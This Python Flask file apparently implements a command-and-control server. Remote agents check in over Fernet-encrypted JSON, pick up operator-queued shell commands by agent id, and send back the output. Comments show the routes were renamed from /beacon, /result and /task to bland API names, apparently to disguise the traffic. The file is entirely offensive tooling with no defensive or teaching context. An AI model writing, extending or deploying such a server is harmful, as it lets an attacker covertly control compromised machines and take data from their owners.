from flask import Flask, request, jsonify
from cryptography.fernet import Fernet
import json

app = Flask(__name__)

#in-memory task list
tasks = {}

# This key must be the same on client and server
SECRET_KEY = b'YOUR_ECRET_KEY=='
cipher = Fernet(SECRET_KEY)

def encrypt_data(data):
    encoded = data.encode()
    encrypted = cipher.encrypt(encoded)
    return encrypted.decode()

def decrypt_data(data):
    decrypted = cipher.decrypt(data.encode())
    return decrypted.decode()

@app.route('/api/status', methods=['POST'])  #old /beacon
def status():
    encrypted = request.json.get('data')
    decrypted_json = decrypt_data(encrypted)
    beacon_info = json.loads(decrypted_json)

    agent_id = beacon_info.get('id')

    task = tasks.pop(agent_id, None)
    response = {"task": task} if task else {"task":None}

    encrypted_reponase = encrypt_data(json.dumps(response))
    return jsonify({"data": encrypted_reponase})


@app.route('/api/upload', methods=['POST'])  #old /result
def upload():
    encrypted = request.json.get('data')
    decrypted_json = decrypt_data(encrypted)
    result_info = json.loads(decrypted_json)

    agent_id = result_info.get('id')
    output = result_info.get('output')

    print(f"[+] Result from {agent_id} : {output}")
    return jsonify({"status":"received"})


@app.route('/api/push', methods=['POST'])   #old /task
def push():
    encrypted = request.json.get('data')
    decrypt_json = decrypt_data(encrypted)
    task_info = json.loads(decrypt_json)

    agent_id = task_info.get('id')
    command = task_info.get('command')

    if agent_id not in tasks:
        tasks[agent_id] = []
    tasks[agent_id].append(command)

    return jsonify({"status":"task queued"})


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)